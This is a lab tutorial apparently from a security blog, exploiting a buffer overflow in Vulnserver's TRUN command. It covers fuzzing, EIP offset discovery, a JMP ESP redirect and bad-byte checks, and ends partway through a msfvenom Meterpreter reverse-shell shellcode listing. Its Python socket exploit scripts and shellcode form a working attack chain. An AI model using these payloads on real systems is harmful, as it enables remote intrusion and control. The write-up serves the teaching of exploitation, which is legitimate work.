---
title: Vulnserver &#58; Buffer Overflow on TRUN Function
date: 2023-01-28 08:00:00 +0800
categories: [security, red-team]
tags: [exploit, buffer-overflow] # TAG names should always be lowercase
---

This is a notes on how to exploit buffer overflow bugs on an application called Vulnserver which has no functional use other than act as an exploit target for understanding the impact on buffer overflow and learn to exploit them.

## Preparation

before we begin, we need to prepare a few thing :

1. We need a windows machine that connected to a kali linux machine. It can be virtual or physical depends on available resources. In this case I use virtual for both machine.
2. Install the tools needed to perform the analysis and exploitation.

   - Windows Machine :

     - Immunity debugger (`https://debugger.immunityinc.com/`)
     - Mona (`https://github.com/corelan/mona`), to install mona → Drop mona.py into the 'PyCommands' folder (C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\)

   - Kali Machine
     - Code editor → VS Code, Sublime or anything you like
     - Fuzzer → this time I use Spike
     - msfvenom
     - netcat

3. Turn off windows firewall and any running antivirus on the windows machine to accept command from Kali.
4. Download the vulnserver from [https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver) - you can download them as a zip or directly clone the repository to your local git instance. I this case I just download the zip file to my local.
5. Extract the zip file then try to run the vulnserver.exe from you windows machine. You will see something that looks like the screenshot bellow

   ```powershell
   C:\tools\vulnserver>vulnserver.exe
   Starting vulnserver version 1.00
   Called essential function dll version 1.00

   This is vulnerable software!
   Do not allow access from untrusted systems or networks!

   Waiting for client connections...
   ```

6. From your Kali machine, open terminal and run

   ```bash
   # my windows machine IP is 192.168.231.130, Yours might be different
   $ nc 192.168.231.130 9999
   Welcome to Vulnerable Server! Enter HELP for help.

   # typing ‘HELP’ will display all of the available command bellow
   HELP
   Valid Commands:
   HELP
   STATS [stat_value]
   RTIME [rtime_value]
   LTIME [ltime_value]
   SRUN [srun_value]
   TRUN [trun_value]
   GMON [gmon_value]
   GDOG [gdog_value]
   KSTET [kstet_value]
   GTER [gter_value]
   HTER [hter_value]
   LTER [lter_value]
   KSTAN [lstan_value]
   EXIT
   ```

7. Now we are connected to the **Vulnserver**, lets start analyzing the program behavior. For this purpose, we will working on the TRUN command which vulnerable to buffer-overflow.

## Fuzzing

To analyze the program behavior, we will send a lot of TCP Request to TRUN command using Spike.

### Create Fuzzing Script

Spike need a file containing a fuzzing script as parameter. Lets create one. Open code editor, type these script bellow and save it as **fuzzer.spk**

```bash
# catch the welcome banner displayed when we are connected to the vulndserver
s_readline();

# contruct the command to run
s_string("TRUN ");
s_string_variable("FUZZ");
```

### Run Vulnserver from Immunity Debugger

1. open the immunity debugger on windows and run vulnserver.exe.
2. Choose file > open or using F3 as shortcut
3. Go to vulnserver folder, choose vulnserver.exe then click open

   ![Open immunity debugger](/assets/img/2023-28-01/open_immunity_debugger.png)

4. Run the vulnserver.exe by clicking the red play button or using F9 as shortcut. notice on the bottom right corner the status is now **Running**.

### Run Spike

On Kali machine, open terminal and run the following command

```bash
# Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
# example: ./generic_send_tcp 192.168.1.100 701 something.spk 0 0

$ generic_send_tcp 192.168.231.130 9999 fuzzer.spk 0 0

# Spike will start generating request to Vulnserver
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=Welcome to Vulnerable Server! Enter HELP for help.
Fuzzing Variable 0:1
Variablesize= 5004
Fuzzing Variable 0:2
Variablesize= 5005
Fuzzing Variable 0:3
Variablesize= 21
Fuzzing Variable 0:4
Variablesize= 3
Fuzzing Variable 0:5
Variablesize= 2
Fuzzing Variable 0:6
Variablesize= 7
Fuzzing Variable 0:7
Variablesize= 48
Fuzzing Variable 0:8
Variablesize= 45
Fuzzing Variable 0:9
Variablesize= 49
Fuzzing Variable 0:10
Variablesize= 46
Fuzzing Variable 0:11
.......
.......
```

On the other screen the status in the immunity debugger changed from **Running** to **Paused** indicating that Spike successfully cause the Vulnserver to crash. As We can see “Access violation when executing [41414141]” on the bottom left corner.

![Access violation](/assets/img/2023-28-01/access_violation.png)

What this is mean is that the application cannot understand what the instruction 41414141 in EIP register was. This is because Spike override the EIP register value with 41414141 or AAAA by sending a bunch of ‘A’ character to the Vulnserver.

> EIP (Extended Instruction Pointer) register → tells the computer where to go next to execute the next command and controls the flow of a program.
> {: .prompt-info }

![Overriden by a bunch of 'A' characters](/assets/img/2023-28-01/overriden_by_a_characters.png)

Notice that the ESP register also overridden by a bunch of A character. By using this information now the next question is : **instead of sending a bunch of A character, what if We send malicious code to ESP register and find a way to execute those code by overriding the value of EIP register?**

![ESP overriden as well](/assets/img/2023-28-01/esp_overriden.png)

## Analyzing

We know that the application breaking by sending a bunch of ‘A’ character, now we can use this information to further analyze this problem.

- First we need to know how much ‘A’ was send to break the application. For this we need to find the address of the first letter ‘A’ was sent to the application. You can do this by scrolling up the until you find the first ‘A’ and scroll all the way down until you find the last ‘A’ like this screenshot bellow.
  Notice that on my machine the start address is **00FCF1F0** and last address is **00FCFD98** (it will be differ on other machine, so don’t worry if You have different memory address as mine)
  ![First ‘A’ location in memory](/assets/img/2023-28-01/first_a_location.png)
  ![Last ‘A’ location in memory](/assets/img/2023-28-01/last_a_location.png)
  Using Calculator (Programmer) on windows, we substract **0x00FCFD98** by **0x00FCF1F0** and we get **0x00000BA8** as the result in Hexadecimal, or **2984** in Decimals. this is means that we have **2984** byte of character to break and exploit this program.
  ![Calculator](/assets/img/2023-28-01/calculator.png)
- Now we have the size of our payload, next we need to find which ‘A’ character from all of those A’s that override the EIP register. This is quite challenging since we only send ‘A’ character.
  Luckily there is a program in Kali that allow us to send a string pattern of characters to determine where the exact pattern that override the EIP registers occur in those **2984** string.
  to do this, lets jump back to terminal in Kali and run :

  ```bash
  $ msf-pattern-create -l 2984

  # this command will spit a string pattern of 2984 characters length bellow.
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv
  ```

  to send those pattern, we will write a simple codes using python3 and save it as exploit.py

  ```python
  #!/usr/bin/env python3

  import socket

  s = socket.socket()
  s.connect(("192.168.231.130", 9999))

  # copy string pattern into payload
  payload = [
      b"TRUN /.:/",
      b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv"
  ]
  payload = b"".join(payload)
  s.send(payload)
  s.close()
  ```

  the string **/.:/** after the TRUN command comes from Spike.
  Notice from the screenshot bellow when spike sending tcp request to Vulnserver, it starts the parameters with strings like **/.:/** before sending a bunch of ‘A’ characters. so we need to put that in our payload as well.
  ![Dot and Colon](/assets/img/2023-28-01/dot_colon.png)
  To run those code, Reload (Ctrl+F2) and run (F9) Vulnserver from immunity debugger, then run the exploit.py from Kali machine.

  ```bash
  $ python3 exploit.py
  ```

  Notice that the Vulnserver is crashing and this time the **EIP** register overridden with a different value (**386F4337**)
  ![String Pattern](/assets/img/2023-28-01/string_pattern.png)
  Now using msf-pattern_offset tools in kali, we can find the offset of string **386F4337** in our long string pattern.

  ```bash
  $ msf-pattern_offset -l 2984 -q 386F4337
  [*] Exact match at offset 2003
  ```

  it tells us that string **386F4337** is at offset **2003**, nice!.

  Using those information, we can modify our code to control the **EIP** value as we want.

  ```bash
  #!/usr/bin/env python3

  import socket

  s = socket.socket()
  s.connect(("192.168.231.130", 9999))

  total_length = 2984
  offset = 2003 # we just add this variable
  new_eip = b"BBBB" # add new_eip value as we want

  payload = [
      b"TRUN /.:/",
      b"A" * offset,
  		new_eip,
  		b"C" * (total_length - offset - len(new_eip)) # this will keep the payload length to 2984
  ]
  payload = b"".join(payload)
  s.send(payload)
  s.close()
  ```

Rerun the Vulnserver from Immunity Debugger and run the exploit.py again from Kali machine.

after we run the code we got the EIP filled with 42 or character ‘B’ and also the ESP now filled with a bunch of C. this mean now we can control whats inside the EIP as well as ESP registers.

![Control EIP and ESP](/assets/img/2023-28-01/control_eip_esp.png)

## Control The Execution Flow

Now we can craft a shell code then send it to the ESP register, but we need to find a way to tell the EIP register to jump the execution to ESP register.

To do this we could use mona from inside the immunity debugger it self. On the bottom left corner type :

```bash
!mona jmp -r ESP # this command will tell mona to search for the pointers that call the Jump ESP instruction inside the program.
```

![Mona Command](/assets/img/2023-28-01/mona_command.png)

As the result, mona will list all available JMP ESP instruction. As You can see there is 9 pointers that allow Us to jump to ESP registers.

![Mona Result](/assets/img/2023-28-01/mona_result.png)

from this result, look for the last two result at the bottom that include the ascii characters. It will help Us easily send it to the program. Copy the address the one with ascii, in this case **62501203** and paste it into the code as the new value of **new_eip** variables

```python
#!/usr/bin/env python3

import socket
import struct

s = socket.socket()
s.connect(("192.168.231.130", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203) # we update this value

payload = [
    b"TRUN /.:/",
    b"A" * offset,
		new_eip,
		b"C" * (total_length - offset - len(new_eip)) # keep the payload length to 2984
]
payload = b"".join(payload)
s.send(payload)
s.close()
```

Now lets setup breakpoint on the immunity debugger at the address **0x62501203** to see whether the **new_eip** successfully jump to it.

go to the address **0x62501203** using control+g, paste the address and press OK

right-click the address choose breakpoint > toggle or use F2 for the shortcut.

![Setup Breakpoint](/assets/img/2023-28-01/setup_breakpoint.png)

Run the program using F9 then run the exploit.py from Kali machine

![Call JMP ESP](/assets/img/2023-28-01/call_jmp_esp.png)

The program will paused at breakpoint, as you can see the EIP register will contain the address for the pointer that call the JMP ESP. And if we press F8 (step over), it will jump right to ESP and execute what is stored in it. in this case a bunch of 43 or C characters.

![Execute ESP](/assets/img/2023-28-01/execute_esp.png)

We have successfully control the execution flow of the program to execute the ESP. well done!

## Weaponizing

Now we can execute whats in the ESP, lets create a shell code. But before that we need to discuss about a few things.

### Bad Bytes

Some machine or program might not execute what’s inside the shell code for example 0x00 (null byte) that used as string termination or an end of a string in some programming language like C or C++. So if there is a null byte inside the shell code, it just wont work.

The way we can test this is by sending all 256 characters to the TRUN function. Lets modify our exploit.py.

```python
#!/usr/bin/env python3

import socket
import struct

# we add this section to test for bad bytes
all_characters = b"".join([struct.pack('<B', x) for x in range(1, 256)])
# we start from 1-256 because we know at the index 0 there is 0x00 (null byte) hanging around. so lets just skip that.

s = socket.socket()
s.connect(("192.168.231.130", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203)

payload = [
    b"TRUN /.:/",
    b"A" * offset,
		new_eip,
		all_characters, # sending all characters to TRUN function
		b"C" * (total_length - offset - len(new_eip) - len(all_characters))
		# substract with the length of all_characters to keep the payload length to 2984
]
payload = b"".join(payload)
s.send(payload)
s.close()
```

Restart the Vulnserver and run the exploit.py again.

![Follow in Dump](/assets/img/2023-28-01/follow_in_dump.png)

notice that now the ESP is updated with other than C characters. following this right click on the address pointed by the EIP on the left choose Follow in Dump > Selection.

![All bytes](/assets/img/2023-28-01/all_bytes.png)

check to see if there is any skipped characters all the way from 01 to FF. if there wasn’t any, then we are good to go.

### Nop Sled (\x90)

This refer to the sequence of instruction that contain no-operation. so we tell the computer to do nothing and move to the next instruction. the machine instruction for that is \x90. The Nop-sled part in our payload is important to add some reliability in our exploit. This is partly because memory moves around slightly, and our code is jumping around from EIP to the pointer of ESP then finally jump to ESP, there is a chance our memory address slightly moved to other location. So wherever our code land in a nop-sled it will slide the execution into our shell code.

![No-op-Sled](/assets/img/2023-28-01/nop_sled.png)

to add a nop-sled we modify exploit.py bellow.

```bash
#!/usr/bin/env python3

import socket
import struct

s = socket.socket()
s.connect(("192.168.231.130", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203)
nop_sled = b"\x90" * 16 #adding a nop sled

payload = [
    b"TRUN /.:/",
    b"A" * offset,
		new_eip,
		nop_sled,
		b"C" * (total_length - offset - len(new_eip) - len(nop_sled)) # substract with the length of all_characters to keep the payload length to 2984
]
payload = b"".join(payload)
s.send(payload)
s.close()
```

### Shell Code

Now lets generate a shell code using msfvenom that already available in kali.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -b "\x00" -f python

# the -b "\x00" will tell the msfvenom not to include null byte in the shell code
# it will generate the following code
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 1887 bytes
buf =  b""
buf += b"\xd9\xc2\xbb\x55\xef\x23\xaa\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x59\x31\x5a\x19\x83\xc2\x04\x03\x5a"
buf += b"\x15\xb7\x1a\xdf\x42\xb8\xe5\x20\x93\xa6\x6c\xc5"
buf += b"\xa2\xf4\x0b\x8d\x97\xc8\x58\xc3\x1b\xa3\x0d\xf0"
buf += b"\x2c\x04\xfb\xde\xb9\x18\xd4\x2f\x41\xed\xe4\xfc"
buf += b"\x81\x6c\x99\xfe\xd5\x4e\xa0\x30\x28\x8f\xe5\x86"
buf += b"\x46\x60\xbb\x93\xfb\x6e\x6b\x2f\xb9\xb2\x92\xff"
buf += b"\xb5\x8a\xec\x7a\x09\x7e\x41\x84\x5a\xf5\x01\xa6"
buf += b"\xd1\x41\xaa\xa7\x36\x01\x4f\x6e\xcc\x9d\x7e\x8e"
buf += b"\x64\x56\xb4\xfb\x76\xbe\x84\x3b\xd4\xff\x28\xb6"
buf += b"\x24\x38\x8e\x29\x53\x32\xec\xd4\x64\x81\x8e\x02"
buf += b"\xe0\x15\x28\xc0\x52\xf1\xc8\x05\x04\x72\xc6\xe2"
buf += b"\x42\xdc\xcb\xf5\x87\x57\xf7\x7e\x26\xb7\x71\xc4"
buf += b"\x0d\x13\xd9\x9e\x2c\x02\x87\x71\x50\x54\x6f\x2d"
buf += b"\xf4\x1f\x82\x38\x88\xe0\x5c\x45\xd4\x76\x90\x88"
buf += b"\xe7\x86\xbe\x9b\x94\xb4\x61\x30\x33\xf4\xea\x9e"
buf += b"\xc4\x8d\xfd\x20\x1a\x35\x6d\xdf\x9b\x45\xa7\x24"
buf += b"\xcf\x15\xdf\x8d\x70\xfe\x1f\x31\xa5\x6a\x2a\xa5"
buf += b"\x86\xc2\xcd\xb1\x6f\x10\x12\xab\x33\x9d\xf4\x9b"
buf += b"\x9b\xcd\xa8\x5b\x4c\xad\x18\x34\x86\x22\x46\x24"
buf += b"\xa9\xe9\xef\xcf\x46\x47\x47\x78\xfe\xc2\x13\x19"
buf += b"\xff\xd9\x59\x19\x8b\xeb\x9e\xd4\x7c\x9e\x8c\x01"
buf += b"\x1b\x60\x4d\xd2\x8e\x60\x27\xd6\x18\x37\xdf\xd4"
buf += b"\x7d\x7f\x40\x26\xa8\xfc\x87\xd8\x2d\x34\xf3\xef"
buf += b"\xbb\x78\x6b\x10\x2c\x78\x6b\x46\x26\x78\x03\x3e"
buf += b"\x12\x2b\x36\x41\x8f\x58\xeb\xd4\x30\x08\x5f\x7e"
buf += b"\x59\xb6\x86\x48\xc6\x49\xed\xca\x01\xb5\x73\xe5"
buf += b"\xa9\xdd\x8b\xb5\x49\x1d\xe6\x35\x1a\x75\xfd\x1a"
